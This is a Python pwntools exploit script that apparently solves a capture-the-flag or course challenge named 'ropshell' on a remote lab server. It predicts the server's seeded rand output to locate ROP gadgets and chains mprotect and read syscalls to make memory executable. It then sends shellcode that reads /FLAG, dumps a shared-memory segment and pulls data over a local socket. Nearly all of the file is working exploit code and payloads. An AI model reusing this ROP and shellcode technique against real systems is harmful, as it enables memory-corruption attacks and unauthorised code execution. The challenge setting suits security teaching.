#!/usr/bin/env python3
# -*- coding: utf-8 -*-

import os
import sys
import pow as pw
from pwn import *
import ctypes
libc = ctypes.CDLL('libc.so.6')
context.arch = 'amd64'
context.os = 'linux'

LEN_CODE =	10*0x10000


r = None
if 'qemu' in sys.argv[1:]:
    r = process("qemu-x86_64-static ./ropshell", shell=True)
elif 'bin' in sys.argv[1:]:
    r = process("./ropshell", shell=False)
elif 'local' in sys.argv[1:]:
    r = remote("localhost", 10494)
else:
    r = remote("up23.zoolab.org", 10494)

if type(r) != pwnlib.tubes.process.process:
    pw.solve_pow(r)

nothing  = r.recvuntil(b'** Timestamp is ')
time  = int(r.recvline()[:-1])
nothing = r.recvuntil(b'** Random bytes generated at ')
mem_addr = int(r.recvline()[:-1],16)

print('***********')
print(time)
print(hex(mem_addr))
print('***********')

codeint = []
libc.srand(time)
for i in range(LEN_CODE//4):
    codeint.append(hex((libc.rand()<<16 | libc.rand() & 0xffff)& 0xffffffff)[2:])
# print(codeint)

rax = asm("""
    ret
    pop rax  
""").hex()

rdi = asm("""
    ret
    pop rdi  
""").hex()

rsi = asm("""
    ret
    pop rsi
""").hex()

rdx = asm("""
    ret
    pop rdx  
""").hex()

print('Rax : ',rax)
print('Rdi : ',rdi)

# The second question

flag_find_rax = False
flag_find_rdx = False
flag_find_rdi = False
flag_find_rsi = False
index_rsi = 0
index_rdi = 0
index_rax = 0
index_rdx = 0

index_sys = (int((libc.rand() % (LEN_CODE/4 - 1))) & 0xffffffff) * 4
for i in range(len(codeint)):
    if flag_find_rax and flag_find_rdi and flag_find_rdx and flag_find_rsi:
        break
    if codeint[i][-4:] == rax :
        index_rax = 4*i
        flag_find_rax = True
    if codeint[i][-4:] == rdi:
        index_rdi = 4*i
        flag_find_rdi = True
    if codeint[i][-4:] == rdx :
        index_rdx = 4*i
        flag_find_rdx = True
    if codeint[i][-4:] == rsi:
        index_rsi = 4*i
        flag_find_rsi = True

index_rsi += mem_addr
index_rdi += mem_addr
index_rax += mem_addr
index_rdx += mem_addr
index_sys += mem_addr
print('rax')
print(hex(index_rax))
print('rdx')
print(hex(index_rdx))
print('rdi')
print(hex(index_rdi))
print('rsi')
print(hex(index_rsi))
print('sys')
print(hex(index_sys))


# memprotect
# read
mprotect_payload = flat([
    p64(index_rax),
    p64(10),
    p64(index_rdi),
    p64(mem_addr),
    p64(index_rsi),
    p64(LEN_CODE),
    p64(index_rdx),
    p64(7),
    p64(index_sys),  
    p64(index_rax),
    p64(0),
    p64(index_rdi),
    p64(0),
    p64(index_rsi),
    p64(mem_addr),
    p64(index_rdx),
    p64(LEN_CODE),
    p64(index_sys),
    p64(mem_addr)
])

# first = asm('''
#     mov rax, 60
#     mov rdi, 37
#     syscall
# ''')


# open('/FLAG',0)
# read(3 , label , 66)
# write(1 , label , 66)
# second = asm('''
#     mov rax, 2
#     lea rdi, [rip+label]
#     mov rsi, 0
#     syscall
#     mov rax, 0
#     mov rdi, 3
#     lea rsi, [rip+label]
#     mov rdx, 66
#     syscall
#     mov rax, 1
#     mov rdi, 1
#     lea rsi, [rip+label]
#     mov rdx, 66
#     syscall
#     mov rax, 60
#     mov rdi, 37
#     syscall
#     label : .String "/FLAG"
#     ''')


#   share memory should be read-only that we can get the flag: shmflag in shmget is 0400 & shmflag in shmat is 010000
#   int shm_id = shmget(0x1337, 66, 0400);
#   char *p = (char *) shmat(shm_id, 0 , 010000);
#   write(1 , p , 66)
# third = asm('''
#     mov rax, 29
#     mov rdi, 0x1337
#     mov rsi, 70
#     mov rdx, 0400
#     syscall
#     mov rdi, rax
#     mov rax, 30
#     mov rsi, 0
#     mov rdx, 010000
#     syscall
#     mov rsi, rax
#     mov rax, 1
#     mov rdi, 1
#     mov rdx, 70
#     syscall
#     mov rax, 60
#     mov rdi, 37
#     syscall
#     buf : .String ""
#     ''')


#   myaddr's content
#   myaddr.sin_family = AF_INET
#   myaddr.sin_port = htons(0x1337)
#   inet_aton("127.0.0.1" , myaddr.sin_addr.s_addr)

#   s = socket(AF_INET(2) , SOCK_STREAM(1) , 0)
#   connect(s , (struct socketaddr* )&myaddr , 16)
#   read(s , buf , 0x50)
#   write(1 , buf , 0x50)
four = asm('''
    mov rax, 41
    mov rdi, 2
    mov rsi, 1
    mov rdx, 0
    syscall
    mov rbx, rax
    mov rax, 42
    mov rdi, rbx
    lea rsi, [rip+myaddr]
    mov rdx, 16
    syscall
    mov rax, 0
    mov rdi, rbx
    lea rsi, [rip+buf]
    mov rdx, 66
    syscall
    mov rax, 1
    mov rdi, 1
    lea rsi, [rip+buf]
    mov rdx, 66
    syscall
    mov rax, 60
    mov rdi, 37
    syscall
    buf : .String ""
    myaddr: .Word 2
            .Byte 0x13, 0x37
            .Byte 127, 0 , 0 , 1
            .Byte 0, 0, 0, 0, 0, 0, 0, 0
''')

r.sendafter(b'> ', mprotect_payload)
r.send(asm('''
    mov rax, 2
    lea rdi, [rip+label]
    mov rsi, 0
    syscall
    mov rax, 0
    mov rdi, 3
    lea rsi, [rip+label]
    mov rdx, 66
    syscall
    mov rax, 1
    mov rdi, 1
    lea rsi, [rip+label]
    mov rdx, 66
    syscall
    mov rax, 29
    mov rdi, 0x1337
    mov rsi, 70
    mov rdx, 0400
    syscall
    mov rdi, rax
    mov rax, 30
    mov rsi, 0
    mov rdx, 010000
    syscall
    mov rsi, rax
    mov rax, 1
    mov rdi, 1
    mov rdx, 70
    syscall
    mov rax, 41
    mov rdi, 2
    mov rsi, 1
    mov rdx, 0
    syscall
    mov rbx, rax
    mov rax, 42
    mov rdi, rbx
    lea rsi, [rip+myaddr]
    mov rdx, 16
    syscall
    mov rax, 0
    mov rdi, rbx
    lea rsi, [rip+buf]
    mov rdx, 66
    syscall
    mov rax, 1
    mov rdi, 1
    lea rsi, [rip+buf]
    mov rdx, 66
    syscall
    mov rax, 60
    mov rdi, 37
    syscall
    myaddr: .Word 2
            .Byte 0x13, 0x37
            .Byte 127, 0 , 0 , 1
            .Byte 0, 0, 0, 0, 0, 0, 0, 0
    buf : .String ""
    label : .String "/FLAG"
'''))


# r.sendafter(b'shell> ',p64(mem_addr+index_rax)+ p64(60)+ p64(mem_addr+index_rdi)+ p64(37)+ p64(mem_addr+index_sys))


r.interactive()

# vim: set tabstop=4 expandtab shiftwidth=4 softtabstop=4 number cindent fileencoding=utf-8 :
